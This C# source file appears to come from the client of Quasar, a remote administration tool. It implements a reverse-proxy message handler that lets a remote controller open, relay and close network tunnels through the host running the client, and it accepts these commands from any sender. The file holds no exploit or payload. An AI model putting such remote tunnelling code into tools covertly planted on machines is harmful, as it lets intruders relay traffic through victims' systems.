using Quasar.Client.Networking;
using Quasar.Client.ReverseProxy;
using Quasar.Common.Messages;
using Quasar.Common.Messages.ReverseProxy;
using Quasar.Common.Networking;

namespace Quasar.Client.Messages
{
    public class ReverseProxyHandler : IMessageProcessor
    {
        private readonly QuasarClient _client;

        public ReverseProxyHandler(QuasarClient client)
        {
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is ReverseProxyConnect ||
                                                             message is ReverseProxyData ||
                                                             message is ReverseProxyDisconnect;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ReverseProxyConnect msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyData msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyDisconnect msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, ReverseProxyConnect message)
        {
            _client.ConnectReverseProxy(message);
        }

        private void Execute(ISender client, ReverseProxyData message)
        {
            ReverseProxyClient proxyClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            proxyClient?.SendToTargetServer(message.Data);
        }
        private void Execute(ISender client, ReverseProxyDisconnect message)
        {
            ReverseProxyClient socksClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            socksClient?.Disconnect();
        }
    }
}
